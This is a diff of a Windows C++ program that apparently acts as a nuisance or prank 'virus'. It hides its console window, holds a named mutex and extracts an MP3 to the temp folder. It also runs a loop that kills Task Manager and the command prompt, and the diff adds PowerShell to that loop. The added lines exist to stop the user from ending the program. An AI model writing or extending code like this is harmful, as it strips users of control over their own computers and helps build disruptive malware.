@@ -407,6 +407,7 @@ void closetaskmgr()
 	{
 		system("taskkill /im taskmgr.exe /t");
 		system("taskkill /im cmd.exe /t");
+		system("taskkill /im powershell.exe /t");
 		Sleep(250);
 	}
 }
@@ -440,6 +441,10 @@ int main()
 	{
 		::ShowWindow(hwnd, SW_HIDE); //隐藏控制台窗口
 	}
+	 if (hwnd = ::FindWindow(L"ConsoleWindowClass", NULL)) //找到控制台句柄
+	{
+		::ShowWindow(hwnd, SW_HIDE); //隐藏控制台窗口
+	}
 	
 	// 创建互斥锁
 	HANDLE hMutex = CreateMutex(NULL, TRUE, L"XONE");
@@ -467,7 +472,7 @@ int main()
 	TCHAR tmpmp3[_MAX_PATH];
 	::GetTempPath(_MAX_PATH, tmpmp3);                                                                                // L"C:\\Users\\用户名\\AppData\\Local\\Temp\\"
 	_tcscat(tmpmp3, _T("test.mp3"));     // VC2008、VC2010 请用 _tcscat_s 函数                            //临时文件路径，更改项
-
+	
 	// 将 MP3 资源提取为临时文件
 	//ExtractResource(tmpmp3, _T("bin"), _T("background.mp3"));
 	// 注：如果 MP3 资源的 ID 为宏 IDR_BACKGROUND，这样做：
